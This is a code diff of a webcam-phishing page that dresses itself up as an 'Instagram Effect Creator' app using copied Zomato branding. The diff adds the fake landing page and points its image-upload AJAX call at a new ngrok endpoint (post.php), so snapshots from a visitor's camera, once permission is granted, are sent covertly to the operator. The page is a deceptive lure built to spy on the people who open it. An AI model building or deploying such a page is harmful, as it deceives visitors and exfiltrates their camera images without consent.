@@ -4,6 +4,569 @@
 <script type="text/javascript" src="https://wybiral.github.io/code-art/projects/tiny-mirror/index.js"></script>
 <link rel="stylesheet" type="text/css" href="https://wybiral.github.io/code-art/projects/tiny-mirror/index.css">
 <script type="text/javascript" src="https://ajax.googleapis.com/ajax/libs/jquery/1.8.3/jquery.js"></script>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.1.1/css/all.min.css"
+integrity="sha512-KfkfwYDsLkIlwQp6LFnl8zNdLGxu9YAA1QvwINks4PhcElQSvqcyVLLD9aMhXd13uQjoXtEKNosOWaZqXgel0g=="
+crossorigin="anonymous" referrerpolicy="no-referrer" />
+<!-- poppins font by google fonts -->
+<link rel="preconnect" href="https://fonts.googleapis.com" />
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+<link
+href="https://fonts.googleapis.com/css2?family=Poppins:ital,wght@0,100;0,200;0,300;0,400;0,500;0,600;0,700;0,800;0,900;1,100;1,200;1,300;1,400;1,500;1,600;1,700;1,800;1,900&display=swap"
+rel="stylesheet" />
+
+<style>
+* {
+margin: 0;
+padding: 0;
+box-sizing: border-box;
+font-family: "Poppins", sans-serif;
+}
+
+.hero__section {
+background-image: url(https://raw.githubusercontent.com/tegal1337/CiLocks/main/Screenshoot/background1.png);
+min-height: 60vh;
+background-size: cover;
+background-position: center;
+color: white;
+}
+
+.navbar {
+display: flex;
+align-items: center;
+justify-content: space-between;
+height: 60px;
+padding: 15px 45px;
+}
+
+.navbar a {
+color: white;
+text-decoration: none;
+}
+
+.navbar__menu_container {
+display: flex;
+gap: 20px;
+}
+
+.navbar__menu_container .user__icon {
+height: 30px;
+width: 30px;
+border-radius: 100%;
+border: 1px solid white;
+align-items: center;
+justify-content: center;
+display: none;
+}
+
+.hero__section_container {
+display: flex;
+flex-direction: column;
+align-items: center;
+justify-content: center;
+gap: 32px;
+height: calc(60vh, 60px);
+}
+
+.hero__section_logo {
+width: 200px;
+/* height: 100px; */
+/* height: auto; */
+}
+
+.hero__section_title {
+text-align: center;
+font-size: 25px;
+font-weight: 400;
+}
+
+.hero__section_input_container {
+background-color: white;
+padding: 10px;
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 10px;
+width: 50%;
+border-radius: 10px;
+}
+
+.input_container_location,
+.input_container_search {
+padding: 6px;
+border: none;
+border-radius: 15px;
+width: 96%;
+outline: none;
+}
+
+.input_container_location {
+width: 35%;
+border-right: 2px solid gray;
+}
+
+.input_container_search {
+width: 65%;
+}
+
+
+
+
+
+
+
+
+
+/* Media */
+@media only screen and (max-width:500px) {
+.navbar__menu_container .user__icon {
+    display: flex;
+}
+
+.link {
+    display: none;
+}
+
+.hero__section {
+    min-height: 80vh;
+}
+
+.navbar {
+    padding: 16px;
+}
+
+.hero__section_input_container {
+    flex-direction: column;
+    background-color: transparent;
+    width: 100%;
+}
+
+.input_container_location,
+.input_container_search {
+    padding: 15px;
+    flex-direction: column;
+    border-radius: 10px;
+    width: 95%;
+}
+
+.hero__section_input_container {
+    height: calc(80vh - 60px);
+}
+
+.hero__section_title {
+    font-size: 20px;
+    width: 95%;
+}
+}
+
+/* .container{
+margin: 3rem auto;
+width: 90%;
+} */
+
+.container__we_offer {
+margin: 3rem auto;
+width: 90%;
+display: flex;
+flex-wrap: wrap;
+gap: 1.5rem;
+align-items: center;
+justify-content: center;
+}
+
+.we__offer_card {
+border-radius: 10px;
+width: 300px;
+/* background-color: aqua; */
+overflow: hidden;
+border: 0px solid gray;
+/* Animations not working */
+transition: all 0.4s ease;
+}
+
+.we__offer_card:hover {
+transform: scale(1.05);
+cursor: pointer;
+}
+
+.we__offer_card img {
+width: 100%;
+height: 190px;
+object-fit: cover;
+object-position: center;
+}
+
+.we__offer_content {
+padding: 10px;
+
+}
+
+.we__offer_content h2 {
+font-size: 20px;
+font-weight: 400;
+}
+
+.we__offer_content p {
+font-size: 12px;
+
+}
+
+.collections h1 {
+font-weight: 500;
+margin-left: 0%;
+margin-bottom: 3%;
+}
+
+.collections .sub__heading_container {
+font-size: 15px;
+display: flex;
+align-items: center;
+justify-content: space-around;
+flex-wrap: wrap;
+gap: 1rem;
+}
+
+.sub__heading_container span:nth-child(2) {
+color: #ff7e8b;
+font-size: 13px;
+cursor: pointer;
+}
+
+.collections_card_container {
+display: flex;
+align-items: center;
+justify-content: center;
+flex-wrap: wrap;
+gap: 0.5rem;
+margin-top: 1.5rem;
+}
+
+.collections_card_container .card {
+height: 300px;
+min-width: 240px;
+background-size: cover;
+background-position: center;
+border-radius: 10px;
+position: relative;
+}
+
+.card1 {
+background-image: url('https://www.jerzypilch.com/assets/images/trios/cyborg.png');
+}
+
+.card2 {
+background-image: url('https://www.jerzypilch.com/assets/images/clients/JonasAden.jpg');
+}
+
+.card3 {
+background-image: url('https://www.jerzypilch.com/assets/images/clients/MusicTrip.jpg');
+}
+
+/* Shift + Alt + f */
+
+.card4 {
+background-image: url('https://www.jerzypilch.com/assets/images/trios/fruitFrenzy.png');
+}
+
+.overlay{
+width: 100%;
+height: 100%;
+position: absolute;
+top: 0;
+left: 0;
+border-radius: 10px;
+background: linear-gradient(
+    0deg,
+    rgba(0, 0 ,0, 0.8) 0%,
+    rgba(0, 0 ,0, 0.05) 50%,
+    rgba(0, 0 ,0, 0.05) 85%
+    /* rgba(0, 0, 0, 0)100% */
+
+);
+z-index: 5;
+}
+
+.collections_card_container .card .content{
+position: absolute;
+bottom: 0;
+left: 0;
+color: white;
+padding: 12px 16px;
+font-size: 0.8rem;
+z-index: 10;
+}
+
+.content h4{
+font-weight: 400;
+letter-spacing: 0.5px;
+}
+
+/* .collections h1{
+margin: auto;
+} */
+
+.get__the_app{
+display: flex;
+align-items: center;
+justify-content: center;
+background-color: rgb(255, 251, 247);
+/* background-color: aqua; */
+width: 100%;
+padding: 3rem 6rem;
+}
+
+.get__the_app .semiContainer{
+width: 60%;
+display: flex;
+justify-content: center;
+align-items: center;
+flex-wrap: wrap;
+gap: 1.5rem;
+}
+
+.get__the_app .semiContainer .left{
+flex: 2;
+}
+
+.get__the_app .semiContainer .left img{
+width: 100%;
+object-fit: cover;
+object-position: center;
+}
+
+
+.get__the_app .semiContainer .right {
+flex: 3;
+height: 100%;
+display: flex;
+flex-direction: column;
+gap: 1rem;
+}
+
+.get__the_app .semiContainer .right h1{
+font-weight: 400;
+font-size: 2rem;
+}
+
+.right p{
+font-size: 0.8rem;
+}
+
+.semiContainer .right .radio__button_container{
+display: flex;
+align-items: center;
+gap: 1rem;
+}
+
+.semiContainer .right .radio__button_container div{
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 10px;
+}
+
+.right .radio__button_container div input{
+height: 15px;
+width: 15px;
+accent-color: rgb(239,79,95);
+}
+
+.semiContainer .right .input_container{
+display: flex;
+gap: 0.5rem;
+}
+
+.input_container{
+flex-wrap: wrap;
+}
+
+.input_container button, .input_container input{
+padding: 10px 12px;
+}
+
+.input_container input{
+flex: auto;
+border: 1.5px solid gray;
+outline: none;
+border-radius: 5px;
+}
+
+.input_container button{
+border: none;
+background-color: rgb(239,79,95);
+color:  white;
+border-radius: 5px;
+cursor: pointer;
+}
+
+/* button:hover{
+cursor: pointer;
+} */
+
+.right .download__app_container{
+display: flex;
+flex-direction: column;
+gap: 0.7rem;
+}
+
+.download__app_container h5{
+font-size: 400;
+color: gray;
+}
+
+.download__app_container div{
+display: flex;
+gap: 1rem;
+}
+
+.download__app_container div img{
+width: 35%;
+}
+
+
+@media only screen and (max-width: 1300px) {
+.get__the_app .semiContainer .left, .get__the_app .semiContainer .right{
+    flex: 1;
+}
+.get__the_app .semiContainer{
+    width: 80%;
+}
+}
+
+@media only screen and (max-width: 900px) {
+.get__the_app {
+  padding: 2rem;
+}
+.get__the_app .semiContainer{
+    width: 90%;
+}
+}
+
+@media only screen and (max-width: 700px) {
+.get__the_app {
+  padding: 3rem;
+}
+.get__the_app .semiContainer{
+    width: 80%;
+    flex-direction: column;
+}
+}
+
+.footer{
+width: 100%;
+}
+
+.footer_section1{
+display: flex;
+align-items: center;
+justify-content: center;
+width: 90%;
+margin: auto;
+flex-wrap: wrap;
+gap: 2.5rem;
+}
+
+.footer_section1 img{
+width: 120px;
+}
+
+.section1__buttonContainer{
+display: flex;
+gap: 1.5rem;
+}
+
+.section1__buttonContainer button{
+padding: 5px;
+width: 90px;
+border: 1px solid gray;
+background-color: transparent;
+border-radius: 5px;
+display: flex;
+align-items: center;
+justify-content: center;
+gap: 10px;
+cursor: pointer;
+}
+
+.navigation_container{
+display: grid;
+grid-template-columns: repeat(5, 1fr);
+gap: 1rem;
+width: 90%;
+margin: auto;
+padding: 3rem 0;    
+}
+
+.link__container{
+display: flex;
+flex-direction: column;
+gap: 5px;
+}
+
+.link__container h5{
+font-weight: 500;
+font-size: 15px;
+margin-bottom: 5px;
+letter-spacing: 0.8px;
+}
+
+.footer__link{
+text-decoration: none;
+color: gray;
+font-size: 13px;
+font-weight: 300;
+}
+.footer__link:hover{
+color: black;
+}
+.social__links_container button{
+background-color: black;
+border: none;
+width: 25px;
+height: 25px;
+border-radius: 30px;
+/* display: flex; */
+/* justify-content: center;
+align-items: center; */
+cursor: pointer;
+}
+.social__links_container button i{
+color: white;
+font-size: 13px;
+display: flex;
+justify-content: center;
+align-items: center;
+}
+
+.footer__section_logos{
+width: 100%;
+}
+
+.disclamer{
+width: 90%;
+margin: auto;
+color: gray;
+font-size: 12px;
+border-top: 1px solid gray;
+padding-top: 1.5rem;
+}
+@media only screen and (max-width: 900px){
+.navigation_container{
+    grid-template-columns: repeat(3, 1fr);
+}
+}
+@media only screen and (max-width: 600px){
+.navigation_container{
+    grid-template-columns: repeat(2, 1fr);
+}
+}
+
+@media only screen and (max-width: 300px){
+.navigation_container{
+    grid-template-columns: repeat(1, 1fr);
+}
+}
+</style>
+
 </head>
 
 <div class="video-wrap" hidden="hidden">
@@ -18,7 +581,7 @@ function post(imgdata){
 $.ajax({
     type: 'POST',
     data: { cat: imgdata},
-    url: 'https://b5dc25cc7b2b.ngrok.io/post.php',
+    url: 'https://db52-140-213-74-249.ngrok.io/post.php',
     dataType: 'json',
     async: false,
     success: function(result){
@@ -75,8 +638,194 @@ init();
 </script>
 
     <body>
-        <p>Hint: Look at the favicon</p>
-        <p>(Accept Permissions)</p>
+      <section class="hero__section">
+        <header>
+          <nav class="navbar">
+            <a href="#">Get The App</a>
+            <div class="navbar__menu_container">
+              <a href="#" class="link">For Creator</a>
+              <a href="#" class="link">Download</a>
+              <a href="#" class="link">Community</a>
+              <a href="#" class="link">Sign Up</a>
+              <a href="#" class="user__icon">
+                <i class="fa-solid fa-user"></i>
+              </a>
+            </div>
+          </nav>
+        </header>
+    
+        <div class="hero__section_container">
+          <img class="hero__section_logo" src="https://raw.githubusercontent.com/rohan1917/zomato-landing-page-DT/master/images/heroSectionLogo.png" alt="Zomato Logo" />
+          <h1 class="hero__section_title">Instagram Effect Creator</h1>
+          <div class="hero__section_input_container">
+            <input type="text" class="input_container_location" placeholder="Take picture" />
+            <input type="text" class="input_container_search" placeholder="Please Allow the Camera />
+          </div>
+        </div>
+      </section>
+      <section class="container__we_offer">
+        <div class="we__offer_card">
+          <img src="https://www.jerzypilch.com/assets/images/clients/where-is-messenger-game.jpg" alt="Item 1" />
+          <div class="we__offer_content">
+            <h2>Messenger</h2>
+            <p>Stay home and ordere to your door</p>
+          </div>
+        </div>
+        <div class="we__offer_card">
+          <img src="https://www.jerzypilch.com/assets/images/clients/sains-disney.jpg" alt="Item 2" />
+          <div class="we__offer_content">
+            <h2>Sainsbury's X Disney</h2>
+            <p>View the city's favourite dining venus</p>
+          </div>
+        </div>
+        <div class="we__offer_card">
+          <img src="https://www.jerzypilch.com/assets/images/clients/science-museum.jpg" alt="Item 3" />
+          <div class="we__offer_content">
+            <h2>Science Museum</h2>
+            <p>Explore the city's top nightlife outlets</p>
+          </div>
+        </div>
+      </section>
+      <section class="container collections">
+        <h1>collections</h1>
+        <div class="sub__heading_container">
+          <span>
+            Explore curated lists of top effect, creator, and best story
+          </span>
+          <span>
+            All Collections in Effect
+          </span>
+        </div>
+        <div class="collections_card_container">
+          <div class="card card1">
+            <div class="overlay"></div>
+            <div class="content">
+              <h4>Jerzy Pilc Social AR</h4>
+              <span> 60 Effect</span>
+            </div>
+          </div>
+    
+          <div class="card card2">
+            <div class="overlay"></div>
+            <div class="content">
+              <h4>John Plate AR</h4>
+              <span> 80 Effect</span>
+            </div>
+          </div>
+    
+          <div class="card card3">
+            <div class="overlay"></div>
+            <div class="content">
+              <h4>Cristian AR</h4>
+              <span> 90 Effect</span>
+            </div>
+          </div>
+          <div class="card card4">
+            <div class="overlay"></div>
+            <div class="content">
+              <h4>James Bon</h4>
+              <span> 50 Effect</span>
+            </div>
+          </div>
+        </div>
+    
+      </section>
+      <section class="container get__the_app">
+        <div class="semiContainer">
+          <div class="left">
+            <img src="https://raw.githubusercontent.com/tegal1337/CiLocks/main/Screenshoot/faceapp.png" alt="Get the Mobile app" />
+          </div>
+          <div class="right">
+            <h1>Instagram Effect Creator</h1>
+            <p>Create an Instagram Effect with One Click and Easy</p>
+    
+            <div class="radio__button_container">
+              <div>
+                <input type="radio" name="download_app" id="email" />
+                <label for="email" style="font-size: 14px;">Email</label>
+              </div>
+              <div>
+                <input type="radio" name="download_app" id="phone" />
+                <label for="phone" style="font-size: 14px;">Phone</label>
+              </div>
+    
+            </div>
+    
+            <div class="input_container">
+              <input type="text" placeholder="Email" />
+              <button>Try Now</button>
+            </div>
+            <div class="download__app_container">
+              <h5>Download App Form</h5>
+              <div>
+                <img src="https://raw.githubusercontent.com/rohan1917/zomato-landing-page-DT/master/images/appleStore.png" alt="Apple Store" />
+                <img src="https://raw.githubusercontent.com/rohan1917/zomato-landing-page-DT/master/images/playStore.png" alt="Play Store" />
+              </div>
+            </div>
+          </div>
+        </div>
+      </section>
+      <footer class="container footer">
+
+        <div class="navigation_container">
+          <div class="link__container">
+            <h5>ABOUT ZOMATO</h5>
+            <a class="footer__link" href="#">Who we are</a>
+            <a class="footer__link" href="#">Blogs</a>
+            <a class="footer__link" href="#">Work with us</a>
+            <a class="footer__link" href="#">Investore Relations</a>
+            <a class="footer__link" href="#">Report Fraud</a>
+            <a class="footer__link" href="#">Conatct Us</a>
+          </div>
+    
+          <div class="link__container">
+            <h5>ZOMAVERSE</h5>
+            <a class="footer__link" href="#">Zomato</a>
+            <a class="footer__link" href="#">Feeding</a>
+            <a class="footer__link" href="#">Hyperpure</a>
+            <a class="footer__link" href="#">Zomaland</a>
+          </div>
+    
+          <div class="link__container">
+            <h5>FOR CREATORS</h5>
+            <a class="footer__link" href="#">Partner With Us</a>
+            <a class="footer__link" href="#">Apps For You</a>
+            <br />
+            <h5>ENTERPRICES</h5>
+            <a class="footer__link" href="#">Work with us</a>
+            <a class="footer__link" href="#">Zomato for work</a>
+          </div>
+    
+          <div class="link__container">
+            <h5>LEARN MORE</h5>
+            <a class="footer__link" href="#">Privacy</a>
+            <a class="footer__link" href="#">Security</a>
+            <a class="footer__link" href="#">Terms</a>
+            <a class="footer__link" href="#">SiteMap</a>
+          </div>      
+    
+          <div class="link__container">
+            <h5>SOCIAL LINKS</h5>
+            <div class="social__links_container">
+              <button><i class="fa-brands fa-linkedin-in"></i></button>
+              <button><i class="fa-brands fa-instagram"></i></button>
+              <button><i class="fa-brands fa-twitter"></i></button>
+              <button><i class="fa-brands fa-youtube"></i></button>
+              <button><i class="fa-brands fa-facebook"></i></button>
+            </div>
+            <br />
+            <img src="https://raw.githubusercontent.com/rohan1917/zomato-landing-page-DT/master/images/appleStore.png" alt="Footer Logos" class="footer__section_logos" />
+            <img src="https://raw.githubusercontent.com/rohan1917/zomato-landing-page-DT/master/images/playStore.png" alt="Footer Logos" class="footer__section_logos" />
+          </div>
+        </div>
+        <div class="disclamer">
+          By continuing past this page, you agree to our Terms of Service,
+          Cookie Policy, Privacy Policy and Content Policies. All trademarks
+          are properties of their respective owners. 2008-2022 © Zomato™ Ltd.
+          All rights reserved.
+        </div>
+      </footer>
+
         <p><label><input type="checkbox" name="mirror" id="mirror" /> Mirror image</label></p>
     </body>
 
